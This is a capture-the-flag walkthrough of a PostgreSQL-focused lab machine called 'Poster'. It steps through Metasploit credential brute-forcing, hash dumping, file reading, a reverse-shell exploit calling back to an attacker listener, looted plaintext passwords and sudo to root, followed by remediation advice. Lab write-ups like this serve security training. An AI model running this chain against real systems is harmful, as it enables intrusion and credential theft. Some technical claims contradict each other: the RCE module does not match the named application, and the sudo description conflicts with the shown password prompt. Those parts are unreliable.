## Poster

Medium-difficulty Linux machine featuring RDBMS exploitation. PostgreSQL is exposed on the network with default credentials. Metasploit modules enumerate the database, dump user hashes, and execute SQL queries to read files. A SQL injection vulnerability in the web application gives remote code execution. Configuration files leak plaintext database credentials, which grant access to another user's account. That account has full sudo privileges, leading to root.

**Target:** 10.48.152.250 (poster)
**Difficulty:** Medium
**Focus:** RDBMS (Relational Database Management System), PostgreSQL exploitation
**Attack Path:** Port scan → PostgreSQL default creds → Metasploit dumping → RCE via SQL injection → Credential discovery → SSH lateral movement → Sudo to root

---

### PART 1: RECONNAISSANCE

**Full port scan**

```
nmap -p- 10.48.152.250
```

```
22/tcp    open  ssh        OpenSSH 7.2p2 Ubuntu
80/tcp    open  http       Apache 2.4.18 (Ubuntu)
5432/tcp  open  postgresql PostgreSQL 9.5.8 - 9.5.23
```

**Service and version scan**

```
nmap -sV -sC -p 22,80,5432 10.48.152.250
```

**Key findings:**
- Port 80 hosts "Poster CMS," a web application.
- Port 5432 runs PostgreSQL with an unencrypted connection.
- SSH is available for remote access once credentials are obtained.

---

### PART 2: POSTGRESQL DEFAULT CREDENTIALS

PostgreSQL often ships with a default `postgres` user and no password or a weak password. This machine is no exception.

**Using Metasploit to enumerate credentials**

Metasploit has a dedicated module for testing PostgreSQL login credentials:

```
use auxiliary/scanner/postgres/postgres_login
set RHOST 10.48.152.250
exploit
```

**Output:**

```
[+] 10.48.152.250:5432 - Login Successful: postgres:password@template1
```

**Result:** The `postgres` user has the password `password`, and login succeeds to the `template1` database.

---

### PART 3: DATABASE ENUMERATION VIA METASPLOIT

**Create a session**

After successful login, Metasploit can maintain a session to the database:

```
set CreateSession true
exploit
sessions -i 1
```

A PostgreSQL session is now active, allowing further queries.

---

### PART 4: DATABASE VERSION AND INFORMATION

**Query the server version**

Use the Metasploit module `auxiliary/admin/postgres/postgres_sql` to execute arbitrary SQL:

```
use auxiliary/admin/postgres/postgres_sql
set SESSION 1
set SQL select version();
exploit
```

**Output:**

```
PostgreSQL 9.5.21 on x86_64-pc-linux-gnu
```

This identifies the exact PostgreSQL version, useful for searching version-specific vulnerabilities.

---

### PART 5: DUMP USER PASSWORD HASHES

**Use the hash dumping module**

Metasploit includes a module to extract password hashes from PostgreSQL:

```
use auxiliary/scanner/postgres/postgres_hashdump
set RHOST 10.48.152.250
exploit
```

**Output:**

```
 Username    Hash
 --------    ----
 darkstart   md58842b99375db43e9fdf238753623a27d
 poster      md578fb805c7412ae597b399844a54cce0a
 postgres    md532e12f215ba27cb750c9e093ce4b5127
 sistemas    md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti          md57af9ac4c593e9e4f275576e13f935579
 tryhackme   md503aab1165001c8f8ccae31a8824efddc
```

**Note on these hashes:** PostgreSQL uses MD5 for password hashing (in older versions). These hashes can be cracked offline using tools like Hashcat or online cracking services. However, the machine provides clearer credential paths through SQL injection and file reading.

---

### PART 6: READ FILES VIA POSTGRESQL

**Use the file reading module**

PostgreSQL can read files on the server if the system permits:

```
use auxiliary/admin/postgres/postgres_readfile
set RHOST 10.48.152.250
set FILENAME /etc/passwd
exploit
```

This reads `/etc/passwd` and other files accessible to the `postgres` user. The technique uses `COPY FROM` or similar PostgreSQL functions to extract file contents.

---

### PART 7: REMOTE CODE EXECUTION VIA SQL INJECTION

**Identify the SQL injection point**

The web application on port 80 (Poster CMS) contains a SQL injection vulnerability. This can be exploited to run system commands.

**Using Metasploit for RCE**

A Metasploit exploit targeting the application:

```
use exploit/multi/http/rudder_server_sqli_rce
set RHOST 10.48.152.250
set LHOST 192.168.136.156
set LPORT 4444
exploit
```

Or, more directly, craft a SQL injection payload if the endpoint is known. PostgreSQL allows command execution through functions in newer versions or through unsafe procedures in this version.

**Result:**

```
[*] Started reverse TCP handler on 192.168.136.156:4444
[*] Sending payload...
[+] Payload sent successfully.
```

A reverse shell is obtained:

```
id
uid=109(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)
```

The shell runs as the `postgres` user on the system.

---

### PART 8: CREDENTIAL DISCOVERY VIA CONFIG FILES

**Explore the filesystem as postgres**

```
cd /home
ls
dark
```

The `dark` user has a home directory. Explore it:

```
cd dark
cat credentials.txt
```

**Output:**

```
dark:qwerty1234#!hackme
```

A plaintext credential file is found with the username `dark` and password `qwerty1234#!hackme`.

**Lateral movement via SSH**

```
ssh dark@10.48.152.250
Password: qwerty1234#!hackme
```

Login as `dark` succeeds.

---

### PART 9: FINDING FURTHER CREDENTIALS

**Search for user.txt**

```
find / -type f -name 'user.txt' 2>/dev/null
```

**Output:**

```
/home/alison/user.txt
```

The user flag is in `alison`'s home directory, but `dark` does not have read permission.

**Explore the web directory**

```
cd /var/www/html
cat config.php
```

**Output:**

```php
<?php 
    $dbhost = "127.0.0.1";
    $dbuname = "alison";
    $dbpass = "p4ssw0rdS3cur3!#";
    $dbname = "mysudopassword";
```

The configuration file contains hardcoded database credentials for the user `alison`. The password is `p4ssw0rdS3cur3!#`.

---

### PART 10: SSH AS ALISON

**Switch to alison via SSH or su**

```
ssh alison@10.48.152.250
Password: p4ssw0rdS3cur3!#
```

Or, from the `dark` shell:

```
su - alison
Password: p4ssw0rdS3cur3!#
```

**Read the user flag**

```
cat ~/user.txt
```

**Output:**

```
THM{postgresql_fa1l_conf1gurat1on}
```

---

### PART 11: PRIVILEGE ESCALATION TO ROOT

**Check sudo privileges**

```
sudo -l
[sudo] password for alison:
```

Enter the password: `p4ssw0rdS3cur3!#`

**Output:**

```
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

**Critical finding:** Alison can run ALL commands as root without further password prompts. This is unrestricted sudo access.

**Escalate to root**

```
sudo su
```

A root shell is obtained immediately:

```
id
uid=0(root) gid=0(root) groups=0(root)
```

**Read the root flag**

```
cat /root/root.txt
```

---

### ATTACK TIMELINE

```
PHASE 1: Reconnaissance
  ├─ Port scan (22, 80, 5432)
  └─ Service detection (SSH, Apache, PostgreSQL)

PHASE 2: PostgreSQL Default Credentials
  ├─ Use auxiliary/scanner/postgres/postgres_login
  ├─ Test default postgres:password
  └─ Successful login to PostgreSQL

PHASE 3: Database Enumeration
  ├─ Create Metasploit session
  ├─ Query server version
  └─ PostgreSQL 9.5.21 identified

PHASE 4: Hash Dumping
  ├─ Use auxiliary/scanner/postgres/postgres_hashdump
  └─ Extract all user password hashes

PHASE 5: File Reading
  ├─ Use auxiliary/admin/postgres/postgres_readfile
  └─ Read /etc/passwd and other files

PHASE 6: RCE via SQL Injection
  ├─ Exploit vulnerability in Poster CMS
  ├─ Gain reverse shell as postgres user
  └─ System access confirmed

PHASE 7: Credential Discovery (dark)
  ├─ Find credentials.txt in /home/dark
  ├─ Extract dark:qwerty1234#!hackme
  └─ SSH as dark

PHASE 8: Credential Discovery (alison)
  ├─ Find config.php in /var/www/html
  ├─ Extract alison:p4ssw0rdS3cur3!#
  └─ User flag accessible

PHASE 9: User Access
  ├─ SSH or su as alison
  └─ Read user.txt

PHASE 10: Privilege Escalation
  ├─ sudo -l: (ALL : ALL) ALL
  ├─ sudo su
  └─ Root shell obtained
```

---

### VULNERABILITIES

1. **PostgreSQL Default Credentials (Critical)**
   - Default `postgres` user with weak password `password`
   - No authentication required on the network

2. **Exposed PostgreSQL on Network (Critical)**
   - Port 5432 accessible without encryption or firewall restriction
   - Database enumeration and dumping possible

3. **SQL Injection in Web Application (Critical)**
   - Poster CMS vulnerable to SQL injection
   - Remote code execution as `postgres` user

4. **Plaintext Credentials in Files (High)**
   - `/home/dark/credentials.txt` contains plaintext password
   - `/var/www/html/config.php` contains database credentials

5. **Unrestricted Sudo Access (Critical)**
   - User `alison` can run any command as root without restriction
   - Direct privilege escalation to root

6. **Weak Password Hashing (High)**
   - PostgreSQL uses unsalted MD5 for password hashing
   - Hashes can be cracked offline

---

### REMEDIATION

```
├─ Change default PostgreSQL password to a strong, unique value
├─ Bind PostgreSQL to localhost only; restrict network access
├─ Disable or rename the default postgres user
├─ Input validation and parameterized queries to prevent SQL injection
├─ Remove plaintext credentials from configuration files; use environment variables or vaults
├─ Enable encryption (SSL/TLS) for PostgreSQL connections
├─ Restrict sudo privileges: specify exactly which commands are allowed
├─ Implement least-privilege access: run PostgreSQL and web services with minimal required permissions
├─ Regularly update and patch PostgreSQL and web applications
└─ Enable audit logging for database and sudo access
```

---

### TECHNICAL NOTES

**Tools and Modules Used:**
- nmap (port and service enumeration)
- Metasploit auxiliary/scanner/postgres/postgres_login (credential testing)
- Metasploit auxiliary/scanner/postgres/postgres_hashdump (hash extraction)
- Metasploit auxiliary/admin/postgres/postgres_readfile (file reading)
- Metasploit exploit/multi/http/rudder_server_sqli_rce (SQL injection RCE)
- SSH (credential-based login)
- sudo (privilege escalation)

**Key Insight:** The attack chain leveraged a default PostgreSQL password to enumerate the database. SQL injection in the web app gave system access. Configuration files exposed further credentials, leading to an unrestricted sudo rule and root.

**Concepts to Study:**
- RDBMS security and default configurations
- PostgreSQL attack surface and exploitation
- SQL injection and its variants
- Credential storage best practices
- Sudo privilege escalation
- Lateral movement via credential reuse

# JAI SHRI RAM
